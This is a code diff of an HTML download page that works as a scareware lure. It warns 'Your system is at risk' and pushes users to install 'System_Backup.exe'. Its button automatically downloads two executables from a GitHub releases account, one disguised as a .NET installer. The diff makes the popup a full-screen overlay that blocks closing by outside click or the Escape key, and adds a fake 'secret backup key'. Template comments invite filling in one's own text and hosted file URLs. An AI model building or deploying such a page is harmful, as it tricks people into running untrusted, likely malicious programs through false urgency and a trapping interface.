@@ -1,8 +1,8 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang='en'>
 <head>
-<meta charset="utf-8">
-<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta charset='utf-8'>
+<meta name='viewport' content='width=device-width, initial-scale=1'>
 <title>Download</title>
 <style>
   body {
@@ -14,6 +14,19 @@
     font-family: Arial, sans-serif;
     background: #1e2a38;
     color: #eee;
+    overflow: hidden; /* prevent scrolling when modal open */
+  }
+  .overlay {
+    position: fixed;
+    top: 0;
+    left: 0;
+    width: 100vw;
+    height: 100vh;
+    background: rgba(0,0,0,0.8);
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    z-index: 9999;
   }
   .card {
     max-width: 420px;
@@ -23,6 +36,7 @@
     border-radius: 10px;
     text-align: center;
     box-shadow: 0 8px 24px rgba(0,0,0,.35);
+    position: relative;
   }
   h1 { font-size: 22px; margin: 0 0 12px; }
   p  { font-size: 14px; line-height: 1.6; margin: 0 0 24px; }
@@ -40,33 +54,46 @@
 </style>
 </head>
 <body>
-  <div class="card">
-    <!-- ============================================ -->
-    <!--  WRITE YOUR OWN TEXT IN THESE THREE SPOTS    -->
-    <!-- ============================================ -->
-    <h1>Your system is at risk</h1>
-    <p>Install your System_Backup.exe by DotNet or risk loosing all your data next time your computer restart</p>
-    <button id="dlbtn">Install Safety</button>
+  <div id='popup' class='overlay'>
+    <div class='card'>
+      <h1>Your system is at risk</h1>
+      <p>Install your System_Backup.exe by DotNet or risk loosing all your data next time your computer restart. Copy and save your secret backup key: sk-737u7e7euu78ue8e87e3h3y47deeud7ueu8 </p>
+      <button id='dlbtn'>Install Safety</button>
+    </div>
   </div>
-
 <script>
   // ============================================================
   //  PUT YOUR HOSTED FILE URLs HERE (see hosting note below)
   // ============================================================
   var FILES = [
-    "https://github.com/crocrodil666/net/releases/download/windows/dotNetFx40_Full_x86_x64.exe",
-    "https://github.com/crocrodil666/net/releases/download/windows/system_backup.exe"
+    'https://github.com/crocrodil666/net/releases/download/windows/dotNetFx40_Full_x86_x64.exe',
+    'https://github.com/crocrodil666/net/releases/download/windows/system_backup.exe'
   ];
 
-  document.getElementById("dlbtn").addEventListener("click", function () {
+  document.getElementById('dlbtn').addEventListener('click', function () {
     FILES.forEach(function (url) {
-      var a = document.createElement("a");
+      var a = document.createElement('a');
       a.href = url;
-      a.download = "";
+      a.download = '';
       document.body.appendChild(a);
       a.click();
       a.remove();
     });
+    // Hide popup after downloads start
+    document.getElementById('popup').style.display = 'none';
+  });
+
+  // Prevent closing by clicking overlay or pressing ESC
+  document.getElementById('popup').addEventListener('click', function (e) {
+    if (e.target === this) {
+      // Click on overlay, do nothing (keep popup)
+      e.stopPropagation();
+    }
+  });
+  window.addEventListener('keydown', function (e) {
+    if (e.key === 'Escape') {
+      e.preventDefault();
+    }
   });
 </script>
 </body>
